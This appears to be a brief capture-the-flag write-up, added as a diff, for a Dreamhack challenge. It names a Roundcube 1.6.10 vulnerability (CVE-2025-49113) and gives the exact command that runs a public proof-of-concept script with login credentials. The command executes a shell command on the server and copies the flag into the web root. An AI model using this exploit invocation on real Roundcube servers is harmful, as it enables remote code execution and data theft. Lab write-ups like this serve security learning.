@@ -1,0 +1,6 @@
+TARGET=1.6.10 => Roundcube ≤ 1.6.10 CVE 찾아봄 (CVE-2025-49113)
+payload : php CVE-2025-49113.php http://host3.dreamhack.games:13225/ roundcube dreamhack "cat /flag > /var/www/html/roundcube/public_html/flag.txt"
+
+그 후 flag.txt 접근
+
+참고 자료 출처 : [CVE-2025-49113 PoC](https://github.com/fearsoff-org/CVE-2025-49113)
